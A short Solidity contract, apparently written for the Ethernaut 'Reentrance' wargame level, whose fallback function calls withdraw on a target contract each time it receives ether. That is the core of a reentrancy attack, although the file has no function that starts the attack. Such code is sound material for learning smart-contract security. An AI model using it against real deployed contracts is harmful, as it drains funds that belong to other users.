// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol";
import "./Reentrance.sol";

contract ReentranceHelper {
  
  using SafeMath for uint256;
  Reentrance reetrance;

  constructor(address payable reetranceContractAddr) public {
      reetrance = Reentrance(reetranceContractAddr);
  }

  fallback() external payable {
      reetrance.withdraw(0.001 ether);
  }
}